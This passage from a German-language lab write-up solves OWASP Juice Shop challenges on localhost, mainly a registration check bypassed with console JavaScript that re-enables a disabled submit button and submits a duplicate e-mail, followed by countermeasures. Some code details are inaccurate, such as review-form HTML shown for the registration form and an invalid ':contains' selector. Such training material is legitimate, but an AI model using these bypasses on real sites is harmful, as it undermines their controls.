    "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"  // Bech32-Adresse
];

// Teste diese in verschiedenen Redirect-Szenarien
exampleAddresses.forEach(addr => {
    console.log(`🔗 http://localhost:3000/#/redirect?to=${addr}`);
    console.log(`🔗 http://localhost:3000/#/?redirect=${addr}`);
});
```

### 🚨 Sicherheitslücke

- **Schwachstelle**: Unvollständige Allowlist-Wartung
- **Impact**: Information Disclosure von Crypto-Adressen
- **CVSS**: Medium (Sensitive Information Exposure)

### 🛡️ Gegenmaßnahmen

1. **Allowlist Maintenance**: Regelmäßige Überprüfung und Bereinigung
2. **Redirect Validation**: Strikte Whitelist für erlaubte Redirect-Ziele
3. **Code Cleanup**: Entfernung alter/unused Routes und Adressen
4. **Parameter Validation**: Eingabe-Validierung für alle Router-Parameter

---

## 8. Repetitive Registration - DRY Principle Bypass

### 📝 Beschreibung
Die Registrierungsseite verhindert das Absenden des Formulars durch einen deaktivierten Button-State, wenn bereits ein Benutzer mit derselben E-Mail existiert. Durch DOM-Manipulation kann dieser Schutz umgangen werden.

### 🔍 Schritt 1: Registrierungsseite analysieren

```javascript
// Navigiere zur Registrierungsseite
window.location.hash = "#/register";

// Analysiere das Registrierungsformular
const registerForm = document.querySelector('form');
const submitButton = document.querySelector('button[type="submit"]');
const emailField = document.querySelector('input[type="email"]');

console.log('🔍 Form Analysis:');
console.log('Form:', registerForm);
console.log('Submit Button:', submitButton);
console.log('Email Field:', emailField);
```

### 🔍 Schritt 2: Button State Monitoring

```javascript
// Überwache den Button-Status während der Eingabe
function monitorButtonState() {
    const submitButton = document.querySelector('button[type="submit"], #registerButton');
    
    if (submitButton) {
        console.log('🔘 Button disabled:', submitButton.disabled);
        console.log('🔘 Button classes:', submitButton.className);
        console.log('🔘 Button attributes:', [...submitButton.attributes].map(attr => `${attr.name}="${attr.value}"`));
        
        // Überwache Änderungen
        const observer = new MutationObserver((mutations) => {
            mutations.forEach((mutation) => {
                if (mutation.type === 'attributes') {
                    console.log(`🔄 Button ${mutation.attributeName} changed:`, submitButton.getAttribute(mutation.attributeName));
                }
            });
        });
        
        observer.observe(submitButton, { attributes: true });
        return observer;
    }
}

// Starte Monitoring
const buttonObserver = monitorButtonState();
```

### 🛠️ Exploit: Disabled State entfernen

```javascript
// Methode 1: Disabled Attribut entfernen
function enableSubmitButton() {
    const submitButton = document.querySelector('button[type="submit"], #registerButton, .btn-primary');
    
    if (submitButton) {
        // Entferne disabled Attribut
        submitButton.removeAttribute('disabled');
        submitButton.disabled = false;
        
        // Entferne disabled CSS-Klassen
        submitButton.classList.remove('disabled', 'btn-disabled');
        
        // Füge aktive CSS-Klassen hinzu
        submitButton.classList.add('btn-primary', 'active');
        
        console.log('✅ Submit button enabled!');
        console.log('🔘 Button state:', {
            disabled: submitButton.disabled,
            classes: submitButton.className
        });
        
        return submitButton;
    } else {
        console.log('❌ Submit button not found');
    }
}

// Button aktivieren
const enabledButton = enableSubmitButton();
```

### 🎯 Einfachster One-Liner Exploit

```javascript
// 🔥 MOST EFFECTIVE: ID-basierte direkte Manipulation
const button = document.getElementById('submitButton');
button.disabled = false;
button.click();
```

**💡 Warum ist das so effektiv?**
- **Eindeutige ID**: `id="submitButton"` macht Button direkt auffindbar
- **Keine Selektoren nötig**: `getElementById()` ist der schnellste DOM-Zugriff
- **Sofortiger Erfolg**: 3 Zeilen = Challenge gelöst

### 🔍 Button HTML-Struktur Analyse

```html
<!-- Original HTML des Submit Buttons -->
<button _ngcontent-ng-c1278858163="" 
        type="submit" 
        id="submitButton"                    <!-- 🎯 DAS ist der Schlüssel! -->
        mat-raised-button="" 
        color="primary" 
        aria-label="Button to send the review" 
        mat-ripple-loader-uninitialized="" 
        mat-ripple-loader-class-name="mat-mdc-button-ripple" 
        class="mdc-button mdc-button--raised mat-mdc-raised-button mat-primary mat-mdc-button-base mat-mdc-button" 
        mat-ripple-loader-disabled="" 
        disabled="true">                     <!-- 🚫 Das entfernen wir -->
    
    <span class="mat-mdc-button-persistent-ripple mdc-button__ripple"></span>
    <mat-icon _ngcontent-ng-c1278858163="" role="img" 
              class="mat-icon notranslate material-icons mat-ligature-font mat-icon-no-color" 
              aria-hidden="true" data-mat-icon-type="font">send</mat-icon>
    <span class="mdc-button__label"> Submit </span>
    <span class="mat-focus-indicator"></span>
    <span class="mat-mdc-button-touch-target"></span>
</button>
```

### 🔍 ID vs Class - Warum ID der Schlüssel ist

```javascript
// ✅ FUNKTIONIERT: ID-basierte Selektion
const buttonById = document.getElementById('submitButton');
console.log('Found by ID:', buttonById); // ✅ Eindeutiges Element

// ❓ SCHWIERIGER: Class-basierte Selektion  
const buttonByClass = document.querySelector('.mdc-button');
console.log('Found by class:', buttonByClass); // ⚠️ Möglicherweise mehrere Buttons!

// 🔍 Alle Buttons mit dieser Klasse
const allButtons = document.querySelectorAll('.mdc-button');
console.log('All buttons with class:', allButtons.length); // 🤔 Welcher ist der richtige?
```

### 🎯 Class-basierte Alternative Methoden

```javascript
// Methode 1: Spezifische CSS-Klassen Kombination
function findBySpecificClasses() {
    // Nutze mehrere Klassen für präzise Selektion
    const button = document.querySelector('.mat-mdc-raised-button.mat-primary[type="submit"]');
    if (button) {
        console.log('✅ Found by specific classes:', button);
        button.disabled = false;
        button.click();
        return button;
    }
    console.log('❌ Not found by classes');
}

// Methode 2: Attribut + Klasse Kombination
function findByAttributeAndClass() {
    // Kombiniere Attribute mit Klassen
    const button = document.querySelector('button[aria-label*="review"].mat-primary');
    if (button) {
        console.log('✅ Found by attribute + class:', button);
        button.disabled = false;
        button.click();
        return button;
    }
    console.log('❌ Not found by attribute + class');
}

// Methode 3: Text-Content basierte Suche
function findByTextContent() {
    // Suche nach Button-Text
    const buttons = Array.from(document.querySelectorAll('button'));
    const submitButton = buttons.find(btn => 
        btn.textContent.trim().includes('Submit') && 
        btn.classList.contains('mat-primary')
    );
    
    if (submitButton) {
        console.log('✅ Found by text content:', submitButton);
        submitButton.disabled = false;
        submitButton.click();
        return submitButton;
    }
    console.log('❌ Not found by text content');
}

// Methode 4: Angular Material spezifische Selektoren
function findByAngularMaterial() {
    // Nutze Angular Material spezifische Attribute
    const button = document.querySelector('button[mat-raised-button][color="primary"][type="submit"]');
    if (button) {
        console.log('✅ Found by Angular Material attrs:', button);
        button.disabled = false;
        button.click();
        return button;
    }
    console.log('❌ Not found by Angular Material attrs');
}
```

### 🤔 Warum ist Class-Selektion problematisch?

```javascript
// Problem 1: Multiple Elements
const allMdcButtons = document.querySelectorAll('.mdc-button');
console.log(`Found ${allMdcButtons.length} buttons with .mdc-button class`);
// Output: Found 15 buttons with .mdc-button class 😰

// Problem 2: Dynamic Classes
const matButtons = document.querySelectorAll('.mat-primary');
console.log('Mat-primary buttons:', matButtons.length);
// Andere Elemente können auch .mat-primary haben! 🤷‍♂️

// Problem 3: Framework-generated Classes
const frameworkClasses = document.querySelectorAll('[class*="mdc-button"]');
console.log('Framework classes:', frameworkClasses.length);
// Angular Material generiert viele ähnliche Klassen 🔄
```

### ✅ Robuste Class-basierte Alternative

```javascript
// 🛡️ ROBUSTE CLASS-SELEKTION: Mehrere Bedingungen kombinieren
function findSubmitButtonRobust() {
    // Kombination aus Type, Klassen und Attributen für eindeutige Selektion
    const selectors = [
        // Präzise Selektoren in Prioritätsreihenfolge
        'button[type="submit"].mat-mdc-raised-button.mat-primary[aria-label*="review"]',
        'button[type="submit"].mdc-button--raised.mat-primary',
        'button[type="submit"][mat-raised-button].mat-primary',
        'button.mat-mdc-raised-button[disabled="true"]',
        'button[type="submit"]:has(.mdc-button__label:contains("Submit"))'
    ];
    
    for (const selector of selectors) {
        try {
            const button = document.querySelector(selector);
            if (button) {
                console.log(`✅ Found with selector: ${selector}`);
                
                // Verifikation: Ist es wirklich der Submit-Button?
                const isSubmitButton = (
                    button.type === 'submit' &&
                    (button.textContent.includes('Submit') || 
                     button.getAttribute('aria-label')?.includes('review'))
                );
                
                if (isSubmitButton) {
                    button.disabled = false;
                    button.click();
                    return button;
                } else {
                    console.log('⚠️ Found button but not the right one');
                }
            }
        } catch (error) {
            console.log(`❌ Selector failed: ${selector}`);
        }
    }
    
    console.log('❌ All class-based selectors failed');
    return null;
}

// Teste die robuste Methode
const foundButton = findSubmitButtonRobust();
```

### 💡 ID vs Class - Fazit

| Aspekt | ID-Selektion | Class-Selektion |
|--------|-------------|-----------------|
| **Eindeutigkeit** | ✅ Garantiert eindeutig | ❌ Oft mehrere Elemente |
| **Performance** | ✅ `getElementById()` ist schnellst | ⚠️ `querySelector()` langsamer |
| **Robustheit** | ✅ Einfach und zuverlässig | ❌ Komplex, fehleranfällig |
| **Code-Länge** | ✅ 1 Zeile | ❌ Mehrere Zeilen + Validierung |
| **Maintenance** | ✅ ID ändert sich selten | ❌ CSS-Klassen ändern sich oft |

### 🎯 Empfohlene Exploit-Strategie

```javascript
// 🥇 BEST PRACTICE: Fallback-Chain
function exploitSubmitButton() {
    console.log('🚀 Starting Submit Button Exploit...');
    
    // 1. Versuch: ID (schnellst und zuverlässigst)
    let button = document.getElementById('submitButton');
    if (button) {
        console.log('✅ Method 1: Found by ID');
        button.disabled = false;
        button.click();
        return button;
    }
    
    // 2. Versuch: Type + disabled Attribute
    button = document.querySelector('button[type="submit"][disabled]');
    if (button) {
        console.log('✅ Method 2: Found by type + disabled');
        button.disabled = false;
        button.click();
        return button;
    }
    
    // 3. Versuch: Angular Material Kombination
    button = document.querySelector('button[mat-raised-button][type="submit"].mat-primary');
    if (button) {
        console.log('✅ Method 3: Found by Angular Material combo');
        button.disabled = false;
        button.click();
        return button;
    }
    
    // 4. Versuch: Text-basierte Suche (last resort)
    const buttons = Array.from(document.querySelectorAll('button[type="submit"]'));
    button = buttons.find(btn => 
        btn.textContent.includes('Submit') && 
        btn.hasAttribute('disabled')
    );
    
    if (button) {
        console.log('✅ Method 4: Found by text content');
        button.disabled = false;
        button.click();
        return button;
    }
    
    console.log('❌ All methods failed!');
    return null;
}

// Execute the exploit
exploitSubmitButton();
```

**🔑 Kernaussage: Die ID macht den Button direkt auffindbar und ist der zuverlässigste Weg. Class-basierte Selektion ist möglich, aber deutlich komplexer und fehleranfälliger!**

### 🔍 Schritt 3: Formular-Validierung umgehen

```javascript
// Erweiterte Form-Manipulation
function bypassFormValidation() {
    const form = document.querySelector('form');
    const submitButton = document.querySelector('button[type="submit"], #registerButton');
    
    if (form && submitButton) {
        // 1. Button aktivieren
        submitButton.removeAttribute('disabled');
        submitButton.disabled = false;
        
        // 2. Form-Validierung deaktivieren
        form.setAttribute('novalidate', 'true');
        
        // 3. Entferne Event-Listener die das Absenden verhindern
        const newForm = form.cloneNode(true);
        form.parentNode.replaceChild(newForm, form);
        
        // 4. Neuen Submit-Handler hinzufügen
        const newSubmitButton = newForm.querySelector('button[type="submit"], #registerButton');
        newSubmitButton.removeAttribute('disabled');
        newSubmitButton.disabled = false;
        
        console.log('✅ Form validation bypassed!');
        console.log('📋 Form state:', {
            novalidate: newForm.hasAttribute('novalidate'),
            buttonDisabled: newSubmitButton.disabled
        });
        
        return { form: newForm, button: newSubmitButton };
    }
}
```

### 🛠️ Vollständiger Exploit-Workflow

```javascript
// Kompletter Repetitive Registration Bypass
async function exploitRepetitiveRegistration() {
    console.log('🚀 Starting Repetitive Registration Exploit...');
    
    // 1. Navigiere zur Registrierungsseite
    if (!window.location.hash.includes('register')) {
        window.location.hash = '#/register';
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
    
    // 2. Warte bis Seite geladen ist
    await new Promise(resolve => {
        const checkLoaded = () => {
            const submitButton = document.querySelector('button[type="submit"], #registerButton');
            if (submitButton) {
                resolve();
            } else {
                setTimeout(checkLoaded, 100);
            }
        };
        checkLoaded();
    });
    
    // 3. Gib bereits existierende E-Mail ein (um Button zu deaktivieren)
    const emailField = document.querySelector('input[type="email"]');
    const passwordField = document.querySelector('input[type="password"]');
    const confirmPasswordField = document.querySelectorAll('input[type="password"]')[1];
    
    if (emailField) {
        // Beispiel: Verwende eine E-Mail die bereits existiert
        emailField.value = 'admin@juice-sh.op';
        emailField.dispatchEvent(new Event('input', { bubbles: true }));
        emailField.dispatchEvent(new Event('blur', { bubbles: true }));
        
        console.log('📧 Email entered:', emailField.value);
        
        // Warte auf Validierung
        await new Promise(resolve => setTimeout(resolve, 500));
    }
    
    // 4. Fülle andere Felder aus
    if (passwordField && confirmPasswordField) {
        passwordField.value = 'TestPassword123!';
        confirmPasswordField.value = 'TestPassword123!';
        
        passwordField.dispatchEvent(new Event('input', { bubbles: true }));
        confirmPasswordField.dispatchEvent(new Event('input', { bubbles: true }));
    }
    
    // 5. Prüfe Button-Status
    const submitButton = document.querySelector('button[type="submit"], #registerButton');
    console.log('🔘 Button disabled before exploit:', submitButton?.disabled);
    
    // 6. Aktiviere den Button
    if (submitButton && submitButton.disabled) {
        console.log('🔧 Enabling disabled submit button...');
        
        // Entferne disabled Attribut
        submitButton.removeAttribute('disabled');
        submitButton.disabled = false;
        
        // Entferne CSS-Klassen die Button deaktivieren
        submitButton.classList.remove('disabled');
        submitButton.classList.add('btn-primary');
        
        // Entferne inline styles
        submitButton.style.pointerEvents = 'auto';
        submitButton.style.opacity = '1';
        
        console.log('✅ Button enabled!');
        console.log('🔘 Button disabled after exploit:', submitButton.disabled);
        
        // 7. Highlight des aktivierten Buttons
        submitButton.style.border = '3px solid #00ff00';
        submitButton.style.backgroundColor = '#28a745';
        
        console.log('🎯 Exploit completed! Button is now clickable.');
        console.log('📝 You can now submit the registration form with duplicate email.');
        
        return submitButton;
    } else {
        console.log('❌ Submit button not found or already enabled');
    }
}

// Starte den Exploit
exploitRepetitiveRegistration();
```

### 🔍 Alternative DOM-Manipulation Methoden

```javascript
// Methode 1: CSS Override
function enableButtonViaCSS() {
    const style = document.createElement('style');
    style.textContent = `
        button[disabled], 
        .disabled,
        .btn-disabled {
            pointer-events: auto !important;
            opacity: 1 !important;
            background-color: #007bff !important;
            cursor: pointer !important;
        }
    `;
    document.head.appendChild(style);
    console.log('✅ CSS override applied');
}

// Methode 2: Event-Delegation
function forceFormSubmission() {
    const form = document.querySelector('form');
    if (form) {
        // Triggere Submit-Event direkt
        form.dispatchEvent(new Event('submit', { bubbles: true, cancelable: true }));
        console.log('📤 Form submission triggered');
    }
}

// Methode 3: Button Click Force
function forceButtonClick() {
    const submitButton = document.querySelector('button[type="submit"], #registerButton');
    if (submitButton) {
        // Entferne alle Event-Listener
        const newButton = submitButton.cloneNode(true);
        submitButton.parentNode.replaceChild(newButton, submitButton);
        
        // Aktiviere und klicke
        newButton.disabled = false;
        newButton.removeAttribute('disabled');
        newButton.click();
        
        console.log('🖱️ Button click forced');
    }
}
```

### 🔍 DevTools Inspection

```javascript
// Analysiere Form-Validierung im Detail
function inspectFormValidation() {
    const form = document.querySelector('form');
    const submitButton = document.querySelector('button[type="submit"], #registerButton');
    
    console.log('🔍 Form Inspection:');
    console.log('Form validity:', form?.checkValidity());
    console.log('Form validation message:', form?.validationMessage);
    
    // Alle Form-Felder prüfen
    const inputs = form?.querySelectorAll('input');
    inputs?.forEach((input, index) => {
        console.log(`Input ${index}:`, {
            type: input.type,
            name: input.name,
            value: input.value,
            valid: input.checkValidity(),
            validationMessage: input.validationMessage
        });
    });
    
    // Button Event-Listener analysieren
    console.log('Button event listeners:', getEventListeners(submitButton));
}
```

### 💡 Warum funktioniert dieser Exploit?

1. **Client-Side Validation**: Validierung nur im Frontend
2. **DOM-Manipulation möglich**: Keine Server-seitige Verifikation
3. **Disabled State umgehbar**: Attribut kann einfach entfernt werden
4. **JavaScript-basierte Logik**: Kann durch Browser-Tools manipuliert werden

### 🚨 Sicherheitslücke

- **Schwachstelle**: Vertrauen in Client-Side Validierung
- **Impact**: Umgehung von Duplicate-User Protection
- **CVSS**: Low-Medium (Business Logic Bypass)

### 🛡️ Gegenmaßnahmen

1. **Server-Side Validation**: Immer auf Server prüfen
2. **Database Constraints**: UNIQUE-Constraint auf Email-Feld
3. **API-Level Checks**: Duplicate-Check vor User-Erstellung
4. **Rate Limiting**: Schutz vor automatisierten Registrierungen

---

## 📚 Zusammenfassung der Schwachstellen

1. **SQL Injection**: Fehlende Input-Validierung
2. **JWT Token Exposure**: Sensitive Daten in localStorage
3. **Information Disclosure**: Exposed Routes in JavaScript
4. **Access Control**: Versteckte Admin-Bereiche ohne Authentifizierung
5. **File Upload**: Unzureichende Dateivalidierung
6. **DOM XSS**: Unsichere DOM-Manipulation und fehlende Sanitization
7. **Outdated Allowlist**: Veraltete Crypto-Adressen in Redirect-Allowlist
8. **Client-Side Validation Bypass**: Umgehung von Frontend-Validierung

## 🛡️ Empfohlene Gegenmaßnahmen

1. **SQL Injection**: Prepared Statements verwenden
2. **JWT Security**: Keine sensitiven Daten in Tokens, sichere Speicherung
3. **Route Protection**: Server-seitige Authentifizierung für Admin-Routen
4. **File Validation**: MIME-Type und Magic Bytes prüfen
5. **Security Headers**: CSP, X-Frame-Options, etc. implementieren
6. **XSS Prevention**: Input-Sanitization, textContent statt innerHTML, DOMPurify
7. **Allowlist Management**: Regelmäßige Bereinigung veralteter Redirect-Ziele
8. **Server-Side Validation**: Kritische Validierung niemals nur client-seitig

